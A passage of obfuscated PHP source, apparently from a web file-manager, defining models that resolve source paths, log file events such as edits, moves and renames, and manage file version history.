$†Ñ’Ñ¤Æ[597] . implode($†Ñ’Ñ¤Æ[50], array_slice($ÌƒıÚ…ƒ, 1)) . $†Ñ’Ñ¤Æ[50]; if ($³åÒÕ‹İ[$†Ñ’Ñ¤Æ[194]] == $·‚÷ŒÃ¾) { $³åÒÕ‹İ[$†Ñ’Ñ¤Æ[588]] = $†Ñ’Ñ¤Æ[597]; $³åÒÕ‹İ[$†Ñ’Ñ¤Æ[193]] = $†Ñ’Ñ¤Æ[231]; $³åÒÕ‹İ[$†Ñ’Ñ¤Æ[32]] = LNG($†Ñ’Ñ¤Æ[596]); } $³åÒÕ‹İ[$†Ñ’Ñ¤Æ[598]] = $†Ñ’Ñ¤Æ[599]; } protected function _listAppendPathRoot(&$æÚ¤éÏ—, $¬Ìõ´­Ø) { $™ŸÌ—¼ =& $_SERVER[ùèÅ´Ãš]; static $ÑÜÆ‚ûÈ = false; static $Ü¥¶²Ö = false; $ÓÆÄšÄ˜ = $™ŸÌ—¼[12]; if ($æÚ¤éÏ—[$™ŸÌ—¼[191]] == self::TYPE_USER) { if ($æÚ¤éÏ—[$™ŸÌ—¼[573]] == USER_ID) { $ÓÆÄšÄ˜ = LNG($™ŸÌ—¼[600]); if ($ÑÜÆ‚ûÈ === !1) { $êÈÍı”ı = Model($™ŸÌ—¼[601])->getInfoFull(USER_ID); $ÑÜÆ‚ûÈ = _get($êÈÍı”ı, $™ŸÌ—¼[602], $™ŸÌ—¼[12]); } if ($Ü¥¶²Ö === !1) { $êÈÍı”ı = Model($™ŸÌ—¼[601])->getInfoFull(USER_ID); $Ü¥¶²Ö = _get($êÈÍı”ı, $™ŸÌ—¼[603], $™ŸÌ—¼[12]); } if ($¬Ìõ´­Ø && $¬Ìõ´­Ø[0] == $ÑÜÆ‚ûÈ || !$¬Ìõ´­Ø && $æÚ¤éÏ—[$™ŸÌ—¼[194]] == $ÑÜÆ‚ûÈ) { $ÓÆÄšÄ˜ = LNG($™ŸÌ—¼[604]); $æÚ¤éÏ—[$™ŸÌ—¼[605]] = $™ŸÌ—¼[606]; } if ($¬Ìõ´­Ø && $¬Ìõ´­Ø[0] == $Ü¥¶²Ö || !$¬Ìõ´­Ø && $æÚ¤éÏ—[$™ŸÌ—¼[194]] == $Ü¥¶²Ö) { $ÓÆÄšÄ˜ = $ÓÆÄšÄ˜ . $™ŸÌ—¼[607] . LNG($™ŸÌ—¼[608]); } if (!$¬Ìõ´­Ø) { $æÚ¤éÏ—[$™ŸÌ—¼[32]] = $ÓÆÄšÄ˜; } } else { $êÈÍı”ı = Model($™ŸÌ—¼[601])->getInfoFull($æÚ¤éÏ—[$™ŸÌ—¼[573]]); $ÉÄ›ÄÎ´ = _get($êÈÍı”ı, $™ŸÌ—¼[603], $™ŸÌ—¼[12]); $æÚ¤éÏ—[$™ŸÌ—¼[609]] = Model($™ŸÌ—¼[581])->getInfoSimpleOuter($æÚ¤éÏ—[$™ŸÌ—¼[573]]); $ÓÆÄšÄ˜ = LNG($™ŸÌ—¼[610]) . $™ŸÌ—¼[176] . $æÚ¤éÏ—[$™ŸÌ—¼[609]][$™ŸÌ—¼[32]] . $™ŸÌ—¼[178]; if ($¬Ìõ´­Ø && $¬Ìõ´­Ø[0] == $ÉÄ›ÄÎ´ || !$¬Ìõ´­Ø && $æÚ¤éÏ—[$™ŸÌ—¼[194]] == $ÉÄ›ÄÎ´) { $ÓÆÄšÄ˜ = LNG($™ŸÌ—¼[610]) . $™ŸÌ—¼[611] . $æÚ¤éÏ—[$™ŸÌ—¼[609]][$™ŸÌ—¼[32]] . $™ŸÌ—¼[607] . LNG($™ŸÌ—¼[608]) . $™ŸÌ—¼[178]; } } } else { if ($æÚ¤éÏ—[$™ŸÌ—¼[191]] == self::TYPE_GROUP) { $¾ú€ïõ— = Model($™ŸÌ—¼[589])->getInfoSimple($æÚ¤éÏ—[$™ŸÌ—¼[573]]); $ÓÆÄšÄ˜ = $¾ú€ïõ—[$™ŸÌ—¼[32]]; } else { if ($æÚ¤éÏ—[$™ŸÌ—¼[191]] == self::TYPE_SYSTEM) { $ÓÆÄšÄ˜ = $™ŸÌ—¼[612]; } } } $ÓÆÄšÄ˜ = $ÓÆÄšÄ˜ ? $™ŸÌ—¼[8] . $ÓÆÄšÄ˜ . $™ŸÌ—¼[8] : $™ŸÌ—¼[8]; return $ÓÆÄšÄ˜; } protected function _listAppendUser(&$ÕÃĞºçó) { $…ÓÈÙå =& $_SERVER[ùèÅ´Ãš]; $âÁ—óõ™ = array_to_keyvalue($ÕÃĞºçó, $…ÓÈÙå[12], $…ÓÈÙå[529]); $‹§¼Ø°è = array_to_keyvalue($ÕÃĞºçó, $…ÓÈÙå[12], $…ÓÈÙå[531]); $Íì¸àÏá = array_merge($âÁ—óõ™, $‹§¼Ø°è); $”šÍĞËŸ = Model($…ÓÈÙå[601])->userListInfo($Íì¸àÏá); foreach ($ÕÃĞºçó as &$ûŞú˜ÅÀ) { $’Ù—â‰Ï = $ûŞú˜ÅÀ[$…ÓÈÙå[529]]; $ûŞú˜ÅÀ[$…ÓÈÙå[529]] = $”šÍĞËŸ[$’Ù—â‰Ï] ? $”šÍĞËŸ[$’Ù—â‰Ï] : !1; $’Ù—â‰Ï = $ûŞú˜ÅÀ[$…ÓÈÙå[531]]; $ûŞú˜ÅÀ[$…ÓÈÙå[531]] = $”šÍĞËŸ[$’Ù—â‰Ï] ? $”šÍĞËŸ[$’Ù—â‰Ï] : !1; if (_get($ûŞú˜ÅÀ, $…ÓÈÙå[613], 0)) { $…œÀ“ŞŸ = $GLOBALS[$…ÓÈÙå[6]][$…ÓÈÙå[92]][$…ÓÈÙå[614]]; if ($ûŞú˜ÅÀ[$…ÓÈÙå[543]][$…ÓÈÙå[615]] <= time() - $…œÀ“ŞŸ) { $this->metaSet($ûŞú˜ÅÀ[$…ÓÈÙå[194]], $…ÓÈÙå[616], null); $this->metaSet($ûŞú˜ÅÀ[$…ÓÈÙå[194]], $…ÓÈÙå[615], null); unset($ûŞú˜ÅÀ[$…ÓÈÙå[543]][$…ÓÈÙå[616]]); continue; } $å‹¤íí = $ûŞú˜ÅÀ[$…ÓÈÙå[543]][$…ÓÈÙå[616]]; $ûŞú˜ÅÀ[$…ÓÈÙå[543]][$…ÓÈÙå[617]] = Model($…ÓÈÙå[601])->getInfoSimpleOuter($å‹¤íí); } } unset($ûŞú˜ÅÀ); } public function parentLevelArray($¢åå„ôÉ) { $ïÖÉşÇÏ =& $_SERVER[ùèÅ´Ãš]; $¢åå„ôÉ = explode($ïÖÉşÇÏ[50], trim($¢åå„ôÉ, $ïÖÉşÇÏ[50])); return array_remove_value($¢åå„ôÉ, $ïÖÉşÇÏ[231]); } public function listAll($¢ˆ¢‘ã) { $¿‡™«Îõ =& $_SERVER[ùèÅ´Ãš]; $¾Ğâ£œŠ = $this->sourceInfo($¢ˆ¢‘ã); $º Çà ½ = array($¿‡™«Îõ[618] => array($¿‡™«Îõ[619], $¾Ğâ£œŠ[$¿‡™«Îõ[588]] . $¢ˆ¢‘ã . $¿‡™«Îõ[620]), $¿‡™«Îõ[621] => 0); $£äŒÓÅ = $¿‡™«Îõ[622]; $¾ˆê¨ü = "\x4c\105\x46\124\x20\x4a\117\111\116\40{$this->tablePrefix}\x69\x6f\x5f\146\x69\x6c\x65\x20\146\151\x6c\x65\40\157\156\40\163\157\165\x72\x63\x65\56\x66\151\154\145\x49\x44\40\x3d\x20\146\151\x6c\x65\x2e\146\x69\x6c\145\111\x44"; $Æ®±ôòÎ = $this->alias($¿‡™«Îõ[521])->field($£äŒÓÅ)->where($º Çà ½)->join($¾ˆê¨ü)->select(); $this->_listAppendAuth($Æ®±ôòÎ); $this->_listAppendUser($Æ®±ôòÎ); $this->_listAppendPath($Æ®±ôòÎ); $Æ®±ôòÎ = array_to_keyvalue($Æ®±ôòÎ, $¿‡™«Îõ[194]); $‰´§¡… = "\x2f{$¾Ğâ£œŠ[$¿‡™«Îõ[32]]}\57"; $‰´§¡… = $‰´§¡… == $¿‡™«Îõ[257] ? $¿‡™«Îõ[8] : $‰´§¡…; $´…ïã»À = array(); foreach ($Æ®±ôòÎ as $ïØ¤”şş => $ŠœäÁ—) { $ûòó ô = $this->parentLevelArray($ŠœäÁ—[$¿‡™«Îõ[588]]); array_shift($ûòó ô); $Öº¥‚È = $‰´§¡…; for ($ŠıĞì® = 0; $ŠıĞì® < count($ûòó ô); $ŠıĞì®++) { $Öº¥‚È .= $Æ®±ôòÎ[$ûòó ô[$ŠıĞì®]][$¿‡™«Îõ[32]] . $¿‡™«Îõ[8]; } $Öº¥‚È .= $ŠœäÁ—[$¿‡™«Îõ[32]]; if ($ŠœäÁ—[$¿‡™«Îõ[487]]) { $Öº¥‚È .= $¿‡™«Îõ[8]; } $µÑı÷ı = array($¿‡™«Îõ[497] => str_replace($¿‡™«Îõ[257], $¿‡™«Îõ[8], str_replace($¿‡™«Îõ[257], $¿‡™«Îõ[8], str_replace($¿‡™«Îõ[257], $¿‡™«Îõ[8], $Öº¥‚È))), $¿‡™«Îõ[623] => intval($ŠœäÁ—[$¿‡™«Îõ[487]]), $¿‡™«Îõ[624] => intval($ŠœäÁ—[$¿‡™«Îõ[79]]), $¿‡™«Îõ[88] => intval($ŠœäÁ—[$¿‡™«Îõ[88]]), $¿‡™«Îõ[90] => $this->pathInfoFilter($ŠœäÁ—)); if (!$µÑı÷ı[$¿‡™«Îõ[487]]) { $µÑı÷ı[$¿‡™«Îõ[545]] = $ŠœäÁ—[$¿‡™«Îõ[545]]; } $´…ïã»À[] = $µÑı÷ı; } $´…ïã»À = array_sort_by($´…ïã»À, $¿‡™«Îõ[87]); return $´…ïã»À; } } goto cŞ§ÙçæĞİ; Dµé„ŸùÛ’: class SourceEventModel extends ModelBase { protected $tableName = "\x69\x6f\137\163\157\x75\162\143\145\137\x65\166\x65\156\164"; protected $dataAuto = array(array("\x63\x72\x65\141\x74\x65\124\x69\155\x65", "\164\x69\x6d\145", "\x69\156\163\145\162\x74", "\x66\x75\x6e\x63\x74\x69\x6f\x6e"), array("\144\145\x73\x63", '', "\151\156\x73\x65\162\x74\x2c\x75\x70\144\x61\164\x65\54\x73\145\154\x65\143\164", "\152\163\x6f\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($üñüÛ“Á, $ªËÊ‡øÈ, $òüîâŒ = '') { $˜¿Â¹¢ =& $_SERVER[ùèÅ´Ãš]; if (!$this->eventSave) { return; } $‡Á›¾ã = Model($˜¿Â¹¢[1442])->sourceInfo($üñüÛ“Á); if (!$‡Á›¾ã) { return !1; } if ($this->isDisableEvent($‡Á›¾ã, $ªËÊ‡øÈ)) { return; } if ($òüîâŒ && is_string($òüîâŒ)) { $òüîâŒ = array($˜¿Â¹¢[2036] => $òüîâŒ); } $¹¢šû• = defined($˜¿Â¹¢[2228]) ? USER_ID : 0; $ ÚúäûÊ = array($˜¿Â¹¢[493] => $üñüÛ“Á, $˜¿Â¹¢[2229] => $‡Á›¾ã[$˜¿Â¹¢[193]], $˜¿Â¹¢[2230] => $‡Á›¾ã[$˜¿Â¹¢[32]], $˜¿Â¹¢[586] => !empty($‡Á›¾ã[$˜¿Â¹¢[586]]) ? $‡Á›¾ã[$˜¿Â¹¢[586]] : $˜¿Â¹¢[12], $˜¿Â¹¢[1788] => $¹¢šû•, $˜¿Â¹¢[498] => $ªËÊ‡øÈ, $˜¿Â¹¢[1790] => $òüîâŒ); $this->addSystemLog($ªËÊ‡øÈ, $ ÚúäûÊ); unset($ ÚúäûÊ[$˜¿Â¹¢[2230]], $ ÚúäûÊ[$˜¿Â¹¢[586]]); return $this->add($ ÚúäûÊ); } private function addSystemLog($ôèÄÖßš, $Õ×•‰Ã©) { $Õ°İ´¼ =& $_SERVER[ùèÅ´Ãš]; if ($ôèÄÖßš == $Õ°İ´¼[2231]) { $ôèÄÖßš = $Õ×•‰Ã©[$Õ°İ´¼[528]][$Õ°İ´¼[2232]]; } else { if (in_array($ôèÄÖßš, array($Õ°İ´¼[1977], $Õ°İ´¼[2233]))) { $ôèÄÖßš = $Õ×•‰Ã©[$Õ°İ´¼[528]][$Õ°İ´¼[171]]; } } $Å·ìÄ±Î = array_merge($Õ×•‰Ã©, array($Õ°İ´¼[2234] => $Õ×•‰Ã©[$Õ°İ´¼[194]], $Õ°İ´¼[2235] => $Õ×•‰Ã©[$Õ°İ´¼[2235]])); Hook::trigger($Õ°İ´¼[2236], $Õ°İ´¼[2237] . $ôèÄÖßš, $Õ×•‰Ã©); Model($Õ°İ´¼[1942])->addLog($Õ°İ´¼[2237] . $ôèÄÖßš, $Å·ìÄ±Î); } private function isDisableEvent($ãŒ¿, $±ÊÎãÆà) { $‰ÙŸÇ¤ =& $_SERVER[ùèÅ´Ãš]; if ($ãŒ¿[$‰ÙŸÇ¤[191]] != SourceModel::TYPE_SYSTEM) { return !1; } if ($±ÊÎãÆà == $‰ÙŸÇ¤[1241]) { return !1; } return !0; } public function eventCreate($Á‡×´äê, $ã÷’‡’ü) { $£ƒÔ•îä =& $_SERVER[ùèÅ´Ãš]; $À¢ÙÍÌ× = Model($£ƒÔ•îä[1442])->sourceInfo($Á‡×´äê); $¦®÷ ä³ = array($£ƒÔ•îä[2232] => $ã÷’‡’ü, $£ƒÔ•îä[32] => $À¢ÙÍÌ×[$£ƒÔ•îä[32]]); return $this->addEvent($Á‡×´äê, $£ƒÔ•îä[2231], $¦®÷ ä³); } public function eventFileEdit($Ç‚¶êÎ) { $—’ÅÇÂÇ =& $_SERVER[ùèÅ´Ãš]; $½ĞĞ›î = array($—’ÅÇÂÇ[2238] => $_SERVER[$—’ÅÇÂÇ[2239]], $—’ÅÇÂÇ[2240] => strtolower(ACTION)); if (isset($GLOBALS[$—’ÅÇÂÇ[7]][$—’ÅÇÂÇ[2241]])) { $½ĞĞ›î[$—’ÅÇÂÇ[2241]] = $—’ÅÇÂÇ[91]; } return $this->addEvent($Ç‚¶êÎ, $—’ÅÇÂÇ[1967], $½ĞĞ›î); } public function eventRecycle($” øßĞÛ, $Óó Øù) { return $this->addEvent($” øßĞÛ, $_SERVER[ùèÅ´Ãš][2233], $Óó Øù); } private static $_removeLast = ''; public function eventRemove($ä¸‚Ø°) { $¨¾ï‹½ =& $_SERVER[ùèÅ´Ãš]; self::$_removeLast = $ä¸‚Ø°; $Ÿ‰å¹ÂÚ = Model($¨¾ï‹½[1442])->sourceInfo($ä¸‚Ø°); $ø¦–¨öø = array_field_key($Ÿ‰å¹ÂÚ, array($¨¾ï‹½[194], $¨¾ï‹½[545], $¨¾ï‹½[507], $¨¾ï‹½[588])); $†Ï¾óÂÀ = array($¨¾ï‹½[171] => $Ÿ‰å¹ÂÚ[$¨¾ï‹½[32]], $¨¾ï‹½[2240] => ACTION, $¨¾ï‹½[2242] => $ø¦–¨öø); return $this->addEvent($Ÿ‰å¹ÂÚ[$¨¾ï‹½[193]], $¨¾ï‹½[1241], $†Ï¾óÂÀ); } public function eventShare($ãü’ö¡¸, $Ò·óå”Œ) { return $this->addEvent($ãü’ö¡¸, $_SERVER[ùèÅ´Ãš][1977], $Ò·óå”Œ); } public function eventMove($£°ˆÜåã, $ ÅĞ˜¦ó, $‚’Û ¥´) { $æáºØÁ€ =& $_SERVER[ùèÅ´Ãš]; if (self::$_removeLast == $£°ˆÜåã) { return; } $ÜƒÉÉŞÆ = Model($æáºØÁ€[1442]); $ØæàßõÃ = $ÜƒÉÉŞÆ->sourceInfo($£°ˆÜåã); $Ä÷û’Õû = $ÜƒÉÉŞÆ->sourceInfo($ ÅĞ˜¦ó); $‡£É³öÛ = $ÜƒÉÉŞÆ->sourceInfo($‚’Û ¥´); $¥¯ÍØ²× = array($æáºØÁ€[1253] => $ ÅĞ˜¦ó, $æáºØÁ€[2243] => $Ä÷û’Õû[$æáºØÁ€[32]], $æáºØÁ€[2219] => !empty($Ä÷û’Õû[$æáºØÁ€[586]]) ? $Ä÷û’Õû[$æáºØÁ€[586]] : $æáºØÁ€[12], $æáºØÁ€[1254] => $‚’Û ¥´, $æáºØÁ€[2244] => $‡£É³öÛ[$æáºØÁ€[32]], $æáºØÁ€[2245] => !empty($‡£É³öÛ[$æáºØÁ€[586]]) ? $‡£É³öÛ[$æáºØÁ€[586]] : $æáºØÁ€[12]); $this->addEvent($£°ˆÜåã, $æáºØÁ€[627], $¥¯ÍØ²×); $ØæàßõÃ = $ÜƒÉÉŞÆ->sourceInfo($£°ˆÜåã); $¥¯ÍØ²× = array($æáºØÁ€[194] => $ØæàßõÃ[$æáºØÁ€[194]], $æáºØÁ€[32] => $ØæàßõÃ[$æáºØÁ€[32]]); $this->addEvent($ ÅĞ˜¦ó, $æáºØÁ€[2246], $¥¯ÍØ²×); } public function eventCopy($×»ñ»‘Ê) { $this->eventCreate($×»ñ»‘Ê, $_SERVER[ùèÅ´Ãš][625]); } public function eventRename($Ø‡£ê…, $¨»±îş‡, $Ùå»éÖŠ) { $ªÃ´êÓÆ =& $_SERVER[ùèÅ´Ãš]; $²ÆÍ†œç = array($ªÃ´êÓÆ[1253] => $¨»±îş‡, $ªÃ´êÓÆ[1254] => $Ùå»éÖŠ); return $this->addEvent($Ø‡£ê…, $ªÃ´êÓÆ[1456], $²ÆÍ†œç); } public function eventAddComment($¦™ó½¤ø, $£Œœ»÷) { return $this->addEvent($¦™ó½¤ø, $_SERVER[ùèÅ´Ãš][2247], $£Œœ»÷); } public function eventAddDesc($Ú¿Ï’±Å, $ÎÍ­ºû“) { return $this->addEvent($Ú¿Ï’±Å, $_SERVER[ùèÅ´Ãš][2248], $ÎÍ­ºû“); } public function listBySource($¤¬õ®ø) { $¯¦²´ŠÍ =& $_SERVER[ùèÅ´Ãš]; $§ûÈ¬Ú‚ = Model($¯¦²´ŠÍ[1442])->sourceInfo($¤¬õ®ø); $¬é´Á×… = array($¯¦²´ŠÍ[493] => $¤¬õ®ø); if ($§ûÈ¬Ú‚[$¯¦²´ŠÍ[487]] == $¯¦²´ŠÍ[91]) { $ñ¥ÔÆ½ = Model($¯¦²´ŠÍ[1442])->listSearchChildren($¤¬õ®ø, 20000); $ñ¥ÔÆ½[] = $¤¬õ®ø . $¯¦²´ŠÍ[456]; $¬é´Á×… = array($¯¦²´ŠÍ[194] => array($¯¦²´ŠÍ[7], $ñ¥ÔÆ½)); } $¹×±½Ş = $this->where($¬é´Á×…)->order($¯¦²´ŠÍ[2249])->selectPage(); if ($¹×±½Ş[$¯¦²´ŠÍ[444]][$¯¦²´ŠÍ[445]] == 0) { $¹×±½Ş[$¯¦²´ŠÍ[444]][$¯¦²´ŠÍ[445]] = 1; $¹×±½Ş[$¯¦²´ŠÍ[447]] = array(array($¯¦²´ŠÍ[493] => $¤¬õ®ø, $¯¦²´ŠÍ[2229] => $§ûÈ¬Ú‚[$¯¦²´ŠÍ[193]], $¯¦²´ŠÍ[1788] => $§ûÈ¬Ú‚[$¯¦²´ŠÍ[529]], $¯¦²´ŠÍ[498] => $¯¦²´ŠÍ[2250], $¯¦²´ŠÍ[499] => $§ûÈ¬Ú‚[$¯¦²´ŠÍ[234]], $¯¦²´ŠÍ[1790] => $¯¦²´ŠÍ[12])); } return $this->eventListParse($¹×±½Ş, $¤¬õ®ø); } private function eventListParse($ÓÎòŒÅ¥, $ÛÅšé) { $ÆúñÉì‹ =& $_SERVER[ùèÅ´Ãš]; $ªÜ›¶î˜ = $ÓÎòŒÅ¥[$ÆúñÉì‹[447]]; $æª®ËÖ’ = array_to_keyvalue($ªÜ›¶î˜, $ÆúñÉì‹[12], $ÆúñÉì‹[194]); $ƒö”ˆêÍ = array_to_keyvalue($ªÜ›¶î˜, $ÆúñÉì‹[12], $ÆúñÉì‹[2235]); foreach ($ªÜ›¶î˜ as $Œùä¦­å) { $Âåıú²• = $Œùä¦­å[$ÆúñÉì‹[528]]; if ($Œùä¦­å[$ÆúñÉì‹[33]] == $ÆúñÉì‹[627] && isset($Âåıú²•[$ÆúñÉì‹[1253]])) { $æª®ËÖ’[] = $Âåıú²•[$ÆúñÉì‹[1253]] . $ÆúñÉì‹[12]; $æª®ËÖ’[] = $Âåıú²•[$ÆúñÉì‹[1254]] . $ÆúñÉì‹[12]; } if ($Œùä¦­å[$ÆúñÉì‹[33]] == $ÆúñÉì‹[2246] && isset($Âåıú²•[$ÆúñÉì‹[194]])) { $æª®ËÖ’[] = $Âåıú²•[$ÆúñÉì‹[194]] . $ÆúñÉì‹[12]; } } $æª®ËÖ’ = array_merge($æª®ËÖ’, $ƒö”ˆêÍ, array($ÛÅšé . $ÆúñÉì‹[12])); $æª®ËÖ’ = array_unique($æª®ËÖ’); $­¤­Ó = array_unique(array_to_keyvalue($ªÜ›¶î˜, $ÆúñÉì‹[12], $ÆúñÉì‹[1797])); $Š¨²ÕÉ = Model($ÆúñÉì‹[601])->userListInfo($­¤­Ó); $·¸®ƒİÌ = Model($ÆúñÉì‹[908])->sourceListInfo($æª®ËÖ’, !0); foreach ($ªÜ›¶î˜ as &$Œùä¦­å) { if ($Œùä¦­å[$ÆúñÉì‹[33]] == $ÆúñÉì‹[627] && isset($Œùä¦­å[$ÆúñÉì‹[528]][$ÆúñÉì‹[1253]])) { $Œùä¦­å[$ÆúñÉì‹[528]][$ÆúñÉì‹[1253]] = $·¸®ƒİÌ[$Œùä¦­å[$ÆúñÉì‹[528]][$ÆúñÉì‹[1253]]]; $Œùä¦­å[$ÆúñÉì‹[528]][$ÆúñÉì‹[1254]] = $·¸®ƒİÌ[$Œùä¦­å[$ÆúñÉì‹[528]][$ÆúñÉì‹[1254]]]; } if ($Œùä¦­å[$ÆúñÉì‹[33]] == $ÆúñÉì‹[2246] && isset($Œùä¦­å[$ÆúñÉì‹[528]][$ÆúñÉì‹[194]])) { $Œùä¦­å[$ÆúñÉì‹[528]][$ÆúñÉì‹[194]] = $·¸®ƒİÌ[$Œùä¦­å[$ÆúñÉì‹[528]][$ÆúñÉì‹[194]]]; } $Œùä¦­å[$ÆúñÉì‹[90]] = $·¸®ƒİÌ[$Œùä¦­å[$ÆúñÉì‹[194]]]; $Œùä¦­å[$ÆúñÉì‹[2251]] = $·¸®ƒİÌ[$Œùä¦­å[$ÆúñÉì‹[2235]]]; if ($Œùä¦­å[$ÆúñÉì‹[33]] == $ÆúñÉì‹[1241]) { $Œùä¦­å[$ÆúñÉì‹[2251]] = $Œùä¦­å[$ÆúñÉì‹[90]]; $Œùä¦­å[$ÆúñÉì‹[2235]] = $Œùä¦­å[$ÆúñÉì‹[2251]][$ÆúñÉì‹[194]]; $Œùä¦­å[$ÆúñÉì‹[90]] = !1; $Œùä¦­å[$ÆúñÉì‹[194]] = $ÆúñÉì‹[12]; } $Œùä¦­å[$ÆúñÉì‹[2180]] = $Š¨²ÕÉ[$Œùä¦­å[$ÆúñÉì‹[1797]]]; } unset($Œùä¦­å); $ÓÎòŒÅ¥[$ÆúñÉì‹[447]] = $ªÜ›¶î˜; return $ÓÎòŒÅ¥; } public function removeBySource($Ú¥´˜¹) { $â‰›¼Ê­ = array($_SERVER[ùèÅ´Ãš][493] => $Ú¥´˜¹); $this->where($â‰›¼Ê­)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x73\x6f\x75\162\143\145\x5f\150\151\163\x74\x6f\162\171"; public function historyCount($Ì¢ÅĞ´û) { $ÇÁôõ€š =& $_SERVER[ùèÅ´Ãš]; if (!$Ì¢ÅĞ´û) { return array(); } if (is_string($Ì¢ÅĞ´û) || is_int($Ì¢ÅĞ´û)) { $Ì¢ÅĞ´û = array($Ì¢ÅĞ´û); } $°ˆ…“áˆ = array($ÇÁôõ€š[194], $ÇÁôõ€š[2252] => $ÇÁôõ€š[569]); $÷š‘ÀŠ = array($ÇÁôõ€š[194] => array($ÇÁôõ€š[7], $Ì¢ÅĞ´û)); $¼µÜÆÖ = $this->field($°ˆ…“áˆ)->where($÷š‘ÀŠ)->group($ÇÁôõ€š[194])->select(); return array_to_keyvalue($¼µÜÆÖ, $ÇÁôõ€š[194], $ÇÁôõ€š[569]); } public function addHistory($æÃ’¶Ò , $ô¯ÛÏÖµ = '') { $ã¨øıÙú =& $_SERVER[ùèÅ´Ãš]; $èÊìî÷Å = array($ã¨øıÙú[493] => $æÃ’¶Ò [$ã¨øıÙú[194]], $ã¨øıÙú[1788] => isset($æÃ’¶Ò [$ã¨øıÙú[531]]) ? $æÃ’¶Ò [$ã¨øıÙú[531]] : $æÃ’¶Ò [$ã¨øıÙú[529]], $ã¨øıÙú[546] => $æÃ’¶Ò [$ã¨øıÙú[545]], $ã¨øıÙú[624] => $æÃ’¶Ò [$ã¨øıÙú[79]], $ã¨øıÙú[2253] => $ô¯ÛÏÖµ); if ($GLOBALS[$ã¨øıÙú[6]][$ã¨øıÙú[92]][$ã¨øıÙú[1316]] >= 1) { $this->historyAutoClear($èÊìî÷Å[$ã¨øıÙú[194]]); $this->add($èÊìî÷Å); } Hook::trigger($ã¨øıÙú[2254], $èÊìî÷Å); Model($ã¨øıÙú[2255])->eventFileEdit($æÃ’¶Ò [$ã¨øıÙú[194]]); } private function historyAutoClear($·Üó¡Ò) { $Øáµ´ÍÎ =& $_SERVER[ùèÅ´Ãš]; $ù÷”Êô = Model($Øáµ´ÍÎ[848])->get($Øáµ´ÍÎ[1338]); $Ñ›ÊÏ¬” = intval($GLOBALS[$Øáµ´ÍÎ[6]][$Øáµ´ÍÎ[92]][$Øáµ´ÍÎ[1316]]); $šÔé¾±· = $ù÷”Êô == $Øáµ´ÍÎ[1339] ? min(5, $Ñ›ÊÏ¬”) : $Ñ›ÊÏ¬”; $šÔé¾±· = $šÔé¾±· <= 0 ? 0 : $šÔé¾±· - 1; if ($šÔé¾±· >= 499) { return; } $—ş˜”Æô = array($Øáµ´ÍÎ[493] => $·Üó¡Ò); $œØâ»Å = $this->field($Øáµ´ÍÎ[2256])->where($—ş˜”Æô)->order($Øáµ´ÍÎ[2249])->select(); if (!$œØâ»Å || $šÔé¾±· >= count($œØâ»Å)) { return; } $äÅ†Ÿ®™ = array_to_keyvalue($œØâ»Å, $Øáµ´ÍÎ[12], $Øáµ´ÍÎ[477]); $äÅ†Ÿ®™ = array_slice($äÅ†Ÿ®™, $šÔé¾±·); $æ¡äÍª = array_to_keyvalue($œØâ»Å, $Øáµ´ÍÎ[12], $Øáµ´ÍÎ[545]); $æ¡äÍª = array_slice($æ¡äÍª, $šÔé¾±·); if (!$äÅ†Ÿ®™ || !$æ¡äÍª) { return; } $—ş˜”Æô = array($Øáµ´ÍÎ[495] => array($Øáµ´ÍÎ[7], $äÅ†Ÿ®™)); $this->where($—ş˜”Æô)->delete(); Model($Øáµ´ÍÎ[548])->remove($æ¡äÍª); } public function listData($·şÅµÉ¸) { $ æÓÉ¾Ê =& $_SERVER[ùèÅ´Ãš]; $Ö«ßˆƒ = array($ æÓÉ¾Ê[493] => $·şÅµÉ¸); $‡‡«¯â£ = $ æÓÉ¾Ê[2257]; $‚ì°€»³ = $this->field($‡‡«¯â£)->where($Ö«ßˆƒ)->order($ æÓÉ¾Ê[2249])->selectPage(); $this->_listAppendUser($‚ì°€»³[$ æÓÉ¾Ê[447]]); $İŒ¡·ì = Model($ æÓÉ¾Ê[848])->get($ æÓÉ¾Ê[1338]); $§ãßö·Í = 5; if ($İŒ¡·ì == $ æÓÉ¾Ê[1339]) { $‚ì°€»³[$ æÓÉ¾Ê[447]] = array_slice($‚ì°€»³[$ æÓÉ¾Ê[447]], 0, $§ãßö·Í); $‚ì°€»³[$ æÓÉ¾Ê[444]] = array($ æÓÉ¾Ê[2258] => 1, $ æÓÉ¾Ê[2259] => 20, $ æÓÉ¾Ê[2260] => 1, $ æÓÉ¾Ê[2261] => count($‚ì°€»³[$ æÓÉ¾Ê[447]])); } return $‚ì°€»³; } protected function _listAppendUser(&$›¹îš—) { $ëÀÓÛù =& $_SERVER[ùèÅ´Ãš]; $÷Õôº©— = array_to_keyvalue($›¹îš—, $ëÀÓÛù[12], $ëÀÓÛù[1797]); $”µ®ä°È = Model($ëÀÓÛù[601])->userListInfo($÷Õôº©—); foreach ($›¹îš— as &$±å»µ ) { $Ü¼‘¢ „ = $±å»µ [$ëÀÓÛù[1797]]; $±å»µ [$ëÀÓÛù[529]] = $”µ®ä°È[$Ü¼‘¢ „] ? $”µ®ä°È[$Ü¼‘¢ „] : !1; } unset($±å»µ ); } public function fileInfo($¥ìÜ®½, $ÕêÙšÔÁ = false) { $€ÔÖ£ÙÃ =& $_SERVER[ùèÅ´Ãš]; $§¶µÍŞå = $this->tablePrefix; $†‚¤çÉü = "{$§¶µÍŞå}\x69\x6f\x5f\x66\x69\x6c\x65\40\x66\151\x6c\x65\163\x20\157\x6e\x20\146\x69\x6c\x65\x73\x2e\146\151\x6c\x65\x49\104\x20\x3d\40\x68\x69\163\164\157\x72\171\56\x66\151\154\x65\111\104"; $›óÒ«Â = $this->alias($€ÔÖ£ÙÃ[2262])->where(array($€ÔÖ£ÙÃ[495] => $¥ìÜ®½))->join($†‚¤çÉü, $€ÔÖ£ÙÃ[2263])->find(); if ($›óÒ«Â && $ÕêÙšÔÁ) { $ê»ù×· = array($€ÔÖ£ÙÃ[194] => $›óÒ«Â[$€ÔÖ£ÙÃ[194]], $€ÔÖ£ÙÃ[477] => array($€ÔÖ£ÙÃ[1101], $¥ìÜ®½)); $›óÒ«Â[$€ÔÖ£ÙÃ[1682]] = $this->where($ê»ù×·)->count(); } return $›óÒ«Â; } public function removeItem($ŠïÅ„) { $è’–í¥³ =& $_SERVER[ùèÅ´Ãš]; $”‹¬±€Ë = array($è’–í¥³[495] => $ŠïÅ„); $¥½Ÿõœ = 